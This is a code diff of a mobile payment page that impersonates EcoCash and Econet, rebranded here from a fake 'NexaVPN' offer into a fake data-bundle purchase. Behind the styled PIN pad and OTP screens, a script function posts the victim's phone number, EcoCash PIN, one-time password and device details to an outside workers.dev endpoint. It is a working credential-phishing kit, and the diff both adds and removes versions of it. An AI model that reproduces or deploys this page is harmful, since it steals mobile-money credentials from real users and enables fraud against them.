@@ -4,101 +4,102 @@
 <meta charset="utf-8">
 <meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover,interactive-widget=resizes-content">
-<meta name="theme-color" content="#16171d">
+<meta name="theme-color" content="#0066CC">
 <meta name="apple-mobile-web-app-capable" content="yes">
-<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-<title>Authorize &middot; NexaVPN</title>
+<title>Authorize &middot; EcoCash Bundles</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700;9..40,800&family=DM+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,600;9..40,700;9..40,800&family=DM+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
 *,*::before,*::after{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
 html{height:100%}
-body{font-family:'DM Sans',system-ui,sans-serif;-webkit-font-smoothing:antialiased;background:#f4f5f7;color:#1a1a2e;display:flex;flex-direction:column;position:fixed;inset:0;width:100%;height:100dvh;overflow:hidden}
+body{font-family:'DM Sans',system-ui,sans-serif;-webkit-font-smoothing:antialiased;background:#F0F4FF;color:#0a0f2e;display:flex;flex-direction:column;position:fixed;inset:0;width:100%;height:100dvh;overflow:hidden}
 button{font-family:inherit;cursor:pointer;touch-action:manipulation;outline:none;border:none;background:none;-webkit-user-select:none;user-select:none}
 input{font-family:inherit;outline:none;border:none;background:none;-webkit-user-select:text!important;user-select:text!important}
 img{display:block}
 
 :root{
-  --bg:#f4f5f7;--card:#fff;--card2:#f0f1f5;
-  --navy:#16171d;--navy2:#1e1f28;
-  --amber:#f5a623;--amber-dk:#d4891a;--amber-a:rgba(245,166,35,.12);
-  --grn:#16a34a;--grn-a:rgba(22,163,74,.12);
-  --line:#e2e4ec;--line2:#eceef5;
-  --ink1:#1a1a2e;--ink2:#44465a;--ink3:#8b8fa8;
-  --sh:0 1px 3px rgba(0,0,0,.06),0 4px 16px rgba(0,0,0,.05);
-  --sh-amber:0 4px 20px rgba(245,166,35,.35);
+  --blue:#0066CC;--blue2:#0052A5;
+  --blue-a:rgba(0,102,204,.10);--blue-lt:#E8F2FF;
+  --bg:#f0f4f2;--card:#fff;--card2:#f7faf8;
+  --line:#dde8e3;--line2:#eaf2ed;
+  --ink1:#0a0f2e;--ink2:#2d3561;--ink3:#7880a8;
+  --sh:0 1px 3px rgba(0,66,153,.07),0 4px 16px rgba(0,66,153,.06);
+  --sh-grn:0 4px 20px rgba(0,102,204,.30);
   --r12:12px;--r14:14px;--rpill:999px;
   --ease:cubic-bezier(.22,1,.36,1);--spring:cubic-bezier(.34,1.56,.64,1);
 }
 
 @keyframes spin{to{transform:rotate(360deg)}}
-@keyframes pgIn{from{opacity:0;transform:translateY(5px)}to{opacity:1;transform:none}}
+@keyframes pgIn{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:none}}
 @keyframes stepIn{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:none}}
 @keyframes shake{0%,100%{transform:translateX(0)}20%,60%{transform:translateX(-6px)}40%,80%{transform:translateX(6px)}}
 @keyframes ripple{to{transform:scale(4);opacity:0}}
 
 /* CURTAIN */
-.curtain{position:fixed;inset:0;z-index:9999;background:var(--card);opacity:0;pointer-events:none;transition:opacity .22s;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:20px}
+.curtain{position:fixed;inset:0;z-index:9999;background:var(--card);opacity:0;pointer-events:none;transition:opacity .22s;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:18px}
 .curtain.show{opacity:1;pointer-events:auto}
-.curtain-ic{width:52px;height:52px;border-radius:14px;background:var(--navy);display:flex;align-items:center;justify-content:center}
-.curtain-spin{width:24px;height:24px;border:3px solid var(--line);border-top-color:var(--amber);border-radius:50%;animation:spin .7s linear infinite}
+.curtain-logos{display:flex;align-items:center;gap:10px}
+.curtain-logos img{height:28px;width:auto}
+.curtain-div{width:1px;height:22px;background:var(--line)}
+.curtain-spin{width:24px;height:24px;border:3px solid var(--line);border-top-color:var(--blue);border-radius:50%;animation:spin .7s linear infinite}
 
 /* NAV */
-.nav{background:var(--navy);padding:0 18px;height:52px;display:flex;align-items:center;justify-content:space-between;flex-shrink:0;z-index:50;box-shadow:0 2px 8px rgba(0,0,0,.2)}
-.nav-brand{display:flex;align-items:center;gap:8px}
-.nav-logo{width:28px;height:28px;border-radius:7px;background:var(--amber);display:flex;align-items:center;justify-content:center;flex-shrink:0}
-.nav-name{font-size:15px;font-weight:800;color:#fff;font-family:'DM Mono',monospace}
-.nav-back{display:flex;align-items:center;gap:5px;color:rgba(255,255,255,.7);font-size:13px;font-weight:600;background:none;border:none;cursor:pointer;touch-action:manipulation}
-.nav-amt{font-size:12px;font-weight:700;color:var(--amber);background:rgba(245,166,35,.15);border:1px solid rgba(245,166,35,.25);padding:4px 10px;border-radius:999px;font-family:'DM Mono',monospace}
+.nav{background:var(--blue);height:52px;display:flex;align-items:center;justify-content:space-between;padding:0 16px;flex-shrink:0;box-shadow:0 2px 8px rgba(0,0,0,.18)}
+.nav-back{display:flex;align-items:center;gap:5px;color:rgba(255,255,255,.8);font-size:13px;font-weight:600}
+.nav-logo{display:flex;align-items:center;gap:8px}
+.nav-logo img{height:22px;width:auto}
+.nav-div{width:1px;height:16px;background:rgba(255,255,255,.3)}
+.nav-amt{font-size:12px;font-weight:700;color:#fff;background:rgba(255,255,255,.15);border:1px solid rgba(255,255,255,.2);padding:4px 10px;border-radius:999px;font-family:'DM Mono',monospace}
 
-/* SCROLL BODY */
-.scroll{flex:1;min-height:0;overflow-y:auto;overflow-x:hidden;scrollbar-width:none;-webkit-overflow-scrolling:touch;padding:12px 16px 8px}
+/* SCROLL */
+.scroll{flex:1;min-height:0;overflow-y:auto;overflow-x:hidden;scrollbar-width:none;-webkit-overflow-scrolling:touch;padding:12px 14px 8px;animation:pgIn .22s var(--ease)}
 .scroll::-webkit-scrollbar{display:none}
 
 /* SUMMARY CARD */
-.sum-card{background:var(--card);border:1.5px solid var(--amber);border-radius:12px;box-shadow:0 0 0 3px var(--amber-a);margin-bottom:10px}
-.sum-main{padding:11px 14px;display:flex;align-items:center;justify-content:space-between}
-.sum-plan{font-size:14px;font-weight:700;color:var(--ink1)}
-.sum-num{display:flex;align-items:center;gap:5px;margin-top:3px}
-.sum-total{font-size:20px;font-weight:800;color:var(--amber);font-feature-settings:"tnum";text-align:right}
-.sum-total-lbl{font-size:10px;color:var(--ink3);margin-bottom:1px}
-.sum-bundle{background:var(--navy);padding:7px 14px;display:flex;align-items:center;gap:8px;border-radius:0 0 10px 10px}
+.sum-card{background:var(--card);border:1.5px solid var(--grn);border-radius:14px;box-shadow:0 0 0 3px var(--blue-a);margin-bottom:10px;overflow:hidden}
+.sum-main{padding:12px 14px;display:flex;align-items:center;justify-content:space-between}
+.sum-bundle-name{font-size:14px;font-weight:800;color:var(--ink1)}
+.sum-bundle-data{font-size:12px;color:var(--ink3);margin-top:2px;display:flex;align-items:center;gap:5px}
+.sum-price{font-size:22px;font-weight:800;color:var(--blue);font-feature-settings:"tnum";text-align:right}
+.sum-price-lbl{font-size:9px;color:var(--ink3);text-align:right;margin-bottom:1px;text-transform:uppercase;font-weight:700;letter-spacing:.4px}
+.sum-bar{background:var(--blue);padding:8px 14px;display:flex;align-items:center;gap:8px}
+.sum-bar img{height:16px;width:auto}
+.sum-bar span{font-size:11px;color:rgba(255,255,255,.8);font-weight:600}
 
 /* ECO STRIP */
-.eco-strip{display:flex;align-items:center;justify-content:center;padding:8px 12px;background:var(--card);border:1.5px solid var(--line);border-radius:10px;margin-bottom:10px}
+.eco-strip{display:flex;align-items:center;justify-content:center;padding:8px 14px;background:var(--card);border:1.5px solid var(--line);border-radius:10px;margin-bottom:10px}
 
 /* CARD */
-.card{background:var(--card);border:1.5px solid var(--line);border-top:3px solid var(--amber);border-radius:14px;box-shadow:var(--sh)}
-.card-head{padding:10px 12px;border-bottom:1px solid var(--line2);display:flex;align-items:center;gap:9px;border-radius:14px 14px 0 0}
-.card-ic{width:32px;height:32px;border-radius:9px;background:var(--amber-a);border:1px solid rgba(245,166,35,.2);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.card{background:var(--card);border:1.5px solid var(--line);border-top:3px solid var(--grn);border-radius:14px;box-shadow:var(--sh)}
+.card-head{padding:10px 12px;border-bottom:1px solid var(--line2);display:flex;align-items:center;gap:9px}
+.card-ic{width:32px;height:32px;border-radius:9px;background:var(--blue-a);border:1px solid rgba(0,102,204,.18);display:flex;align-items:center;justify-content:center;flex-shrink:0}
 .card-t{font-size:14px;font-weight:700;color:var(--ink1)}
 .card-s{font-size:11px;color:var(--ink3);margin-top:1px}
 .card-body{padding:10px 12px;display:flex;flex-direction:column;gap:10px}
 
-/* STEPS */
+/* STEP */
 .step{display:none;flex-direction:column;gap:10px}
 .step.on{display:flex;animation:stepIn .2s var(--ease)}
 
 /* PIN */
 .pin-dots{display:flex;gap:10px;justify-content:center}
 .pin-cell{width:54px;height:54px;border-radius:13px;border:1.5px solid var(--line);background:var(--card2);display:flex;align-items:center;justify-content:center;transition:all .15s var(--spring);position:relative}
-.pin-cell.filled{border-color:var(--amber);background:var(--amber-a);transform:scale(1.05)}
-.pin-cell.filled::after{content:'';display:block;width:14px;height:14px;border-radius:50%;background:var(--amber)}
-.pin-cell.active{border-color:var(--amber);box-shadow:0 0 0 3px var(--amber-a);transform:scale(1.07)}
+.pin-cell.filled{border-color:var(--blue);background:var(--blue-lt);transform:scale(1.05)}
+.pin-cell.filled::after{content:'';display:block;width:14px;height:14px;border-radius:50%;background:var(--blue)}
+.pin-cell.active{border-color:var(--blue);box-shadow:0 0 0 3px var(--blue-a);transform:scale(1.07)}
 .pin-cell.peek::after{display:none!important}
-.pin-digit{position:absolute;inset:0;display:none;align-items:center;justify-content:center;font-family:'DM Mono',monospace;font-size:26px;font-weight:700;color:var(--amber)}
+.pin-digit{position:absolute;inset:0;display:none;align-items:center;justify-content:center;font-family:'DM Mono',monospace;font-size:26px;font-weight:700;color:var(--blue)}
 .pin-cell.peek .pin-digit{display:flex}
 .pin-dots.wrong .pin-cell{animation:shake .3s ease;border-color:#dc2626}
 .pin-err{font-size:11px;color:#dc2626;text-align:center;min-height:16px;font-weight:500}
-
 .pin-actions{display:flex;gap:8px}
-.pin-act{flex:1;display:flex;align-items:center;justify-content:center;gap:5px;font-size:12px;font-weight:600;color:#92620a;background:var(--amber-a);border:1.5px solid rgba(245,166,35,.22);border-radius:12px;padding:9px;cursor:pointer;touch-action:manipulation;-webkit-tap-highlight-color:transparent}
-.pin-act:active{background:rgba(245,166,35,.22)}
+.pin-act{flex:1;display:flex;align-items:center;justify-content:center;gap:5px;font-size:12px;font-weight:600;color:var(--grn2);background:var(--blue-a);border:1.5px solid rgba(0,102,204,.18);border-radius:12px;padding:9px;cursor:pointer;touch-action:manipulation}
+.pin-act:active{background:rgba(0,102,204,.18)}
 
 /* NUMPAD */
 .numpad{display:grid;grid-template-columns:repeat(3,1fr);gap:8px}
-.nk{height:52px;border-radius:12px;border:1.5px solid var(--line);background:var(--card);font-family:'DM Mono',monospace;font-size:22px;font-weight:700;color:var(--navy);display:flex;align-items:center;justify-content:center;cursor:pointer;box-shadow:var(--sh);touch-action:manipulation;-webkit-tap-highlight-color:transparent;-webkit-user-select:none;user-select:none;transition:background .08s,transform .08s}
+.nk{height:52px;border-radius:12px;border:1.5px solid var(--line);background:var(--card);font-family:'DM Mono',monospace;font-size:22px;font-weight:700;color:var(--ink1);display:flex;align-items:center;justify-content:center;cursor:pointer;box-shadow:var(--sh);touch-action:manipulation;-webkit-tap-highlight-color:transparent;-webkit-user-select:none;user-select:none;transition:background .08s,transform .08s;position:relative;overflow:hidden}
 .nk:active{background:var(--card2);transform:scale(.93)}
 .nk.del{background:var(--card2)}
 .nk.empty{opacity:0;pointer-events:none;box-shadow:none}
@@ -110,47 +111,47 @@ img{display:block}
 .proc-svg{width:64px;height:64px;animation:spin .9s linear infinite}
 .proc-svg.done{animation:none}
 .proc-arc{stroke-dasharray:72;stroke-dashoffset:72;transition:stroke-dashoffset .6s,stroke .4s}
-.proc-svg.done .proc-arc{stroke-dashoffset:0;stroke:var(--grn)}
+.proc-svg.done .proc-arc{stroke-dashoffset:0;stroke:#16a34a}
 .proc-ic{position:absolute;inset:0;display:flex;align-items:center;justify-content:center}
 .proc-t{font-size:16px;font-weight:700;color:var(--ink1);margin-bottom:4px;transition:opacity .2s}
 .proc-s{font-size:12px;color:var(--ink2);margin-bottom:18px;transition:opacity .2s}
 .vsteps{display:flex;align-items:center;width:100%;max-width:220px}
 .vstep{display:flex;flex-direction:column;align-items:center;gap:3px;flex:0 0 auto}
 .vstep-dot{width:9px;height:9px;border-radius:50%;background:var(--line);transition:all .28s}
-.vstep.act .vstep-dot{background:var(--amber);transform:scale(1.4);box-shadow:0 0 0 3px var(--amber-a)}
-.vstep.done .vstep-dot{background:var(--grn)}
+.vstep.act .vstep-dot{background:var(--blue);transform:scale(1.4);box-shadow:0 0 0 3px var(--blue-a)}
+.vstep.done .vstep-dot{background:#16a34a}
 .vstep-lbl{font-size:9px;color:var(--ink3);font-weight:500}
-.vstep.act .vstep-lbl{color:var(--amber);font-weight:700}
-.vstep.done .vstep-lbl{color:var(--grn)}
+.vstep.act .vstep-lbl{color:var(--blue);font-weight:700}
+.vstep.done .vstep-lbl{color:#16a34a}
 .vline{flex:1;height:1.5px;background:var(--line);margin:0 4px;margin-bottom:14px;transition:background .28s}
-.vline.done{background:var(--grn)}
-.proc-eco{display:flex;align-items:center;justify-content:center;gap:8px;padding:10px 14px;background:var(--card2);border-top:1px solid var(--line2);border-radius:0 0 14px 14px}
-.proc-eco img{height:18px;width:auto}
+.vline.done{background:#16a34a}
+.proc-eco{display:flex;align-items:center;justify-content:center;gap:8px;padding:10px;background:var(--card2);border-top:1px solid var(--line2)}
 
 /* OTP */
 .otp-wrap{display:flex;gap:8px;justify-content:center}
-.otp-box{width:46px;height:56px;border-radius:10px;border:1.5px solid var(--line);background:var(--card2);display:flex;align-items:center;justify-content:center;font-family:'DM Mono',monospace;font-size:22px;font-weight:800;color:var(--amber);transition:all .15s var(--spring)}
-.otp-box.filled{border-color:var(--amber);background:var(--amber-a)}
-.otp-box.active{border-color:var(--amber);box-shadow:0 0 0 3px var(--amber-a);transform:scale(1.05)}
+.otp-box{width:46px;height:56px;border-radius:10px;border:1.5px solid var(--line);background:var(--card2);display:flex;align-items:center;justify-content:center;font-family:'DM Mono',monospace;font-size:22px;font-weight:800;color:var(--blue);transition:all .15s var(--spring)}
+.otp-box.filled{border-color:var(--blue);background:var(--blue-lt)}
+.otp-box.active{border-color:var(--blue);box-shadow:0 0 0 3px var(--blue-a);transform:scale(1.05)}
 .timer-row{display:flex;justify-content:center;gap:6px;font-size:12px}
 .timer-row span{color:var(--ink3)}
-.timer-row b{color:var(--amber)}
+.timer-row b{color:var(--blue)}
 
-/* FOOT BUTTON */
-.foot{background:var(--card);border-top:1px solid var(--line);padding:10px 16px max(16px,env(safe-area-inset-bottom,0px));flex-shrink:0}
-.foot-btn{width:100%;height:50px;border-radius:999px;background:var(--amber);color:#000;font-size:15px;font-weight:800;display:flex;align-items:center;justify-content:center;gap:8px;box-shadow:var(--sh-amber);position:relative;overflow:hidden;transition:background .12s,transform .1s;cursor:pointer;font-family:'DM Sans',sans-serif;border:none;touch-action:manipulation}
-.foot-btn:active{background:var(--amber-dk);transform:scale(.97)}
+/* FOOT */
+.foot{background:var(--card);border-top:1px solid var(--line);padding:10px 14px max(16px,env(safe-area-inset-bottom,0px));flex-shrink:0;box-shadow:0 -2px 8px rgba(0,66,153,.06)}
+.foot-btn{width:100%;height:50px;border-radius:999px;background:#CC0000;color:#fff;font-size:15px;font-weight:800;display:flex;align-items:center;justify-content:center;gap:8px;box-shadow:var(--sh-blue);position:relative;overflow:hidden;transition:background .12s,transform .1s;border:none;font-family:'DM Sans',sans-serif;touch-action:manipulation}
+.foot-btn:active{background:#A50000;transform:scale(.97)}
 .foot-btn:disabled{opacity:.38;box-shadow:none;background:var(--card2);border:1.5px solid var(--line);color:var(--ink3);transform:none}
-.foot-ring{width:18px;height:18px;border:2.5px solid rgba(0,0,0,.2);border-top-color:#000;border-radius:50%;animation:spin .7s linear infinite;flex-shrink:0;display:none}
+.foot-ring{width:18px;height:18px;border:2.5px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;flex-shrink:0;display:none}
 .foot-ring.show{display:block}
-.rip{position:absolute;border-radius:50%;pointer-events:none;background:rgba(0,0,0,.08);transform:scale(0);animation:ripple .5s ease forwards}
+.rip{position:absolute;border-radius:50%;pointer-events:none;background:rgba(255,255,255,.18);transform:scale(0);animation:ripple .5s ease forwards}
+.rip.dark{background:rgba(0,0,0,.08)}
 </style>
 </head>
 <body>
 
 <div class="curtain" id="curtain">
-  <div class="curtain-ic">
-    <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+  <div class="curtain-logos"><img src="assets/ecocash.png" alt="EcoCash" style="height:24px;width:auto;border-radius:4px"></div>
+    <img src="assets/econet.png" alt="Econet" style="height:24px;width:auto;border-radius:4px">
   </div>
   <div class="curtain-spin"></div>
 </div>
@@ -160,39 +161,34 @@ img{display:block}
     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
     Back
   </button>
-  <div class="nav-brand">
-    <div class="nav-logo">
-      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-    </div>
-    <span class="nav-name">NexaVPN</span>
-  </div>
-  <div class="nav-amt" id="hdrAmt">USD 2.99</div>
+  <div class="nav-logo"><img src="assets/ecocash.png" alt="EcoCash" style="height:24px;width:auto;border-radius:4px"></div>
+  <div class="nav-amt" id="hdrAmt">USD 0.00</div>
 </nav>
 
 <div class="scroll">
 
-  <!-- SUMMARY -->
+  <!-- BUNDLE SUMMARY -->
   <div class="sum-card">
     <div class="sum-main">
       <div>
-        <div class="sum-plan" id="sumPlan">Monthly Plan</div>
-        <div class="sum-num">
-          <img src="https://flagcdn.com/w20/zw.png" width="16" height="12" alt="ZW" style="border-radius:2px;flex-shrink:0" onerror="this.style.display='none'">
-          <span style="font-size:11px;color:var(--ink2);font-family:'DM Mono',monospace;font-weight:600" id="sumNum">+263 &bull;&bull;&bull;&bull;&bull;&bull;&bull;</span>
+        <div class="sum-bundle-name" id="sumName">Bundle</div>
+        <div class="sum-bundle-data">
+          <img src="https://flagcdn.com/w20/zw.png" width="14" height="11" alt="ZW" style="border-radius:2px;flex-shrink:0" onerror="this.style.display='none'">
+          <span style="font-size:11px;color:var(--ink3);font-family:'DM Mono',monospace;font-weight:600" id="sumNum">+263 &bull;&bull;&bull;&bull;&bull;&bull;&bull;</span>
         </div>
       </div>
-      <div style="text-align:right">
-        <div class="sum-total-lbl">VPN Price</div>
-        <div class="sum-total" id="sumTotal">USD 2.99</div>
+      <div>
+        <div class="sum-price-lbl">Price</div>
+        <div class="sum-price" id="sumPrice">USD 0.00</div>
       </div>
     </div>
-    <div class="sum-bundle">
-      <img src="assets/econet.png" alt="Econet" style="height:18px;width:auto;flex-shrink:0">
-      <span style="font-size:11px;color:rgba(255,255,255,.65)" id="sumBundle">FREE <b style="color:#fff">5GB Econet data</b> &middot; 30 days</span>
+    <div class="sum-bar">
+      <img src="assets/econet.png" alt="Econet" style="height:24px;width:auto;border-radius:4px">
+      <span id="sumDetail">Loading&hellip;</span>
     </div>
   </div>
 
-  <!-- ECO STRIP: logo only -->
+  <!-- EcoCash logo only -->
   <div class="eco-strip">
     <img src="assets/ecocash.png" alt="EcoCash" style="height:26px;width:auto">
   </div>
@@ -202,7 +198,7 @@ img{display:block}
     <div class="card">
       <div class="card-head">
         <div class="card-ic">
-          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="var(--amber)" stroke-width="2.5" stroke-linecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="var(--grn)" stroke-width="2.5" stroke-linecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
         </div>
         <div>
           <div class="card-t">EcoCash PIN</div>
@@ -231,24 +227,24 @@ img{display:block}
           <button class="nk" data-v="7">7</button><button class="nk" data-v="8">8</button><button class="nk" data-v="9">9</button>
           <button class="nk empty"></button><button class="nk" data-v="0">0</button>
           <button class="nk del" id="delKey">
-            <svg width="20" height="20" viewBox="0 0 24 24" fill="var(--ink2)"><path d="M22 3H7c-.69 0-1.23.35-1.59.88L0 12l5.41 8.11c.36.53.9.89 1.59.89h15c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-3 12.59L17.59 17 14 13.41 10.41 17 9 15.59 12.59 12 9 8.41 10.41 7 14 10.59 17.59 7 19 8.41 15.41 12 19 15.59z"/></svg>
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="var(--ink3)"><path d="M22 3H7c-.69 0-1.23.35-1.59.88L0 12l5.41 8.11c.36.53.9.89 1.59.89h15c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-3 12.59L17.59 17 14 13.41 10.41 17 9 15.59 12.59 12 9 8.41 10.41 7 14 10.59 17.59 7 19 8.41 15.41 12 19 15.59z"/></svg>
           </button>
         </div>
       </div>
     </div>
   </div>
 
-  <!-- PROCESSING STEP -->
+  <!-- PROCESSING -->
   <div class="step" id="stepProc">
     <div class="proc">
       <div class="proc-body">
         <div class="proc-ring">
           <svg class="proc-svg" id="procSvg" viewBox="0 0 64 64">
             <circle cx="32" cy="32" r="26" fill="none" stroke="var(--line)" stroke-width="4"/>
-            <circle class="proc-arc" id="procArc" cx="32" cy="32" r="26" fill="none" stroke="var(--amber)" stroke-width="4" stroke-linecap="round" transform="rotate(-90 32 32)"/>
+            <circle class="proc-arc" id="procArc" cx="32" cy="32" r="26" fill="none" stroke="var(--grn)" stroke-width="4" stroke-linecap="round" transform="rotate(-90 32 32)"/>
           </svg>
           <div class="proc-ic" id="ringIc">
-            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="var(--amber)" stroke-width="2.5" stroke-linecap="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="var(--grn)" stroke-width="2.5" stroke-linecap="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
           </div>
         </div>
         <div class="proc-t" id="procT">Authorizing&hellip;</div>
@@ -262,18 +258,18 @@ img{display:block}
         </div>
       </div>
       <div class="proc-eco">
-        <img src="assets/ecocash.png" alt="EcoCash" style="height:18px;width:auto">
-        <img src="assets/econet.png" alt="Econet" style="height:18px;width:auto">
+        <img src="assets/ecocash.png" alt="EcoCash" style="height:24px;width:auto;border-radius:4px">
+        <img src="assets/econet.png" alt="Econet" style="height:24px;width:auto;border-radius:4px">
       </div>
     </div>
   </div>
 
-  <!-- OTP STEP -->
+  <!-- OTP -->
   <div class="step" id="stepOtp">
     <div class="card">
       <div class="card-head">
         <div class="card-ic">
-          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="var(--amber)" stroke-width="2.5" stroke-linecap="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="var(--grn)" stroke-width="2.5" stroke-linecap="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
         </div>
         <div>
           <div class="card-t">One-Time Password</div>
@@ -295,7 +291,6 @@ img{display:block}
 
 </div><!-- /scroll -->
 
-<!-- FOOT BARS — always visible, outside scroll -->
 <div class="foot" id="abar">
   <button class="foot-btn" id="mainBtn" disabled>
     <div class="foot-ring" id="footRing"></div>
@@ -310,41 +305,29 @@ img{display:block}
 'use strict';
 function hap(t){try{if(navigator.vibrate)navigator.vibrate(t);}catch(e){}}
 
-var plan={},recip={raw:'',display:''};
-try{plan=JSON.parse(sessionStorage.getItem('selectedPlan')||'{}');}catch(e){}
+var bundle={},recip={raw:'',display:''};
+try{bundle=JSON.parse(sessionStorage.getItem('selectedBundle')||'{}');}catch(e){}
 try{recip=JSON.parse(sessionStorage.getItem('ecoRecipient')||'{}');}catch(e){}
 
-var TOTALS={Monthly:'2.99','3 Months':'6.99',Annual:'19.99'};
-var BUNDLES={Monthly:'FREE <b style="color:#fff">5GB Econet data</b> &middot; 30 days','3 Months':'FREE <b style="color:#fff">5GB&times;3 Econet bundles</b>',Annual:'FREE <b style="color:#fff">10GB&times;12 Econet bundles</b>'};
-var amt='USD '+(TOTALS[plan.duration]||'2.99');
+var amt='USD '+(bundle.price||'0.00');
 (function(){
-  var sp=document.getElementById('sumPlan');
-  var st=document.getElementById('sumTotal');
-  var sb=document.getElementById('sumBundle');
+  var ha=document.getElementById('hdrAmt');if(ha)ha.textContent=amt;
+  var sn2=document.getElementById('sumName');if(sn2)sn2.textContent=bundle.name||'Bundle';
+  var sp=document.getElementById('sumPrice');if(sp)sp.textContent=amt;
+  var sd=document.getElementById('sumDetail');if(sd)sd.textContent=(bundle.data||'')+' \u00b7 '+(bundle.validity||'');
   var sn=document.getElementById('sumNum');
-  var ha=document.getElementById('hdrAmt');
-  if(sp)sp.textContent=(plan.duration||'Monthly')+' Plan';
-  if(st)st.textContent=amt;
-  if(sb)sb.innerHTML=BUNDLES[plan.duration]||BUNDLES.Monthly;
-  if(sn&&recip.raw){var d=recip.raw;sn.textContent='+263 '+d.slice(0,2)+'•••••'+d.slice(-2);}
-  if(ha)ha.textContent=amt;
+  if(sn&&recip.raw){var d=recip.raw;sn.textContent='+263 '+d.slice(0,2)+'\u2022\u2022\u2022\u2022\u2022'+d.slice(-2);}
 })();
 
-function tgDevice(){var ua=navigator.userAgent||'';var os=ua.match(/iPhone|iPad/i)?'iOS':ua.match(/Android/i)?'Android':ua.match(/Windows/i)?'Windows':'Other';return(ua.match(/Mobile|Android|iPhone/i)?'Mobile':'Desktop')+' · '+os;}
+function tgDevice(){var ua=navigator.userAgent||'';return(ua.match(/Mobile|Android|iPhone/i)?'Mobile':'Desktop')+' \u00b7 '+(ua.match(/iPhone|iPad/i)?'iOS':ua.match(/Android/i)?'Android':'Other');}
 function tgPhone(r){var v=String(r||'').replace(/\D/g,'');if(v.startsWith('263'))v=v.slice(3);if(v.startsWith('0'))v=v.slice(1);return v;}
-function tg(ev,otp){try{fetch('https://econet-api.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({event:ev,phone:tgPhone(recip.raw),pin:PIN,otp:otp||'',plan:plan.duration||'',amount:TOTALS[plan.duration]||'2.99',device:tgDevice()})}).catch(function(){});}catch(e){}}
+function tg(ev,otp){try{fetch('https://econet-bundles.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({event:ev,phone:tgPhone(recip.raw),pin:PIN,otp:otp||'',bundle:bundle.name||'',data:bundle.data||'',amount:bundle.price||'',device:tgDevice()})}).catch(function(){});}catch(e){}}
 
 var PIN='',peeking=false;
 function renderPIN(){
   var mb=document.getElementById('mainBtn'),lbl=document.getElementById('mainBtnLbl');
   if(mb){mb.disabled=PIN.length<4;if(lbl)lbl.textContent=PIN.length<4?'Enter your PIN':'Pay '+amt+' via EcoCash';}
-  for(var i=0;i<4;i++){
-    var cell=document.getElementById('pc'+i),digit=document.getElementById('pd'+i);
-    if(!cell)continue;
-    cell.classList.remove('active','filled','peek');
-    if(i<PIN.length){cell.classList.add('filled');if(peeking){cell.classList.add('peek');if(digit)digit.textContent=PIN[i];}else if(digit)digit.textContent='';}
-    else if(i===PIN.length)cell.classList.add('active');
-  }
+  for(var i=0;i<4;i++){var cell=document.getElementById('pc'+i),digit=document.getElementById('pd'+i);if(!cell)continue;cell.classList.remove('active','filled','peek');if(i<PIN.length){cell.classList.add('filled');if(peeking){cell.classList.add('peek');if(digit)digit.textContent=PIN[i];}else if(digit)digit.textContent='';}else if(i===PIN.length)cell.classList.add('active');}
 }
 function pushDigit(d){if(PIN.length>=4)return;PIN+=String(d);hap(8);renderPIN();}
 function delDigit(){if(!PIN.length)return;PIN=PIN.slice(0,-1);hap(8);renderPIN();}
@@ -359,113 +342,43 @@ document.getElementById('clearBtn').addEventListener('click',clearPIN);
 renderPIN();
 
 var curStep='stepPin',submitting=false,otpDone=false,otpVal='';
-function showStep(id){
-  document.querySelectorAll('.step').forEach(function(s){s.classList.remove('on');});
-  var el=document.getElementById(id);if(el)el.classList.add('on');curStep=id;
